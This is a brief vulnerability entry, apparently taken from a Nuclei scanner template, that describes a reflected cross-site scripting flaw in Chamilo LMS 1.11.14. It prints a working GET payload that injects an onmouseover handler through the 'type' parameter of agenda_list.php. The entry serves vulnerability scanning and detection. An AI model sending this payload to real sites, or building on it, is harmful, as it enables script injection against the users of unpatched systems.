# Vulnerability: Chamilo LMS 1.11.14 Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`chamilo-lms-xss.yaml`)

## Description
Chamilo LMS 1.11.14 is vulnerable to cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"
```

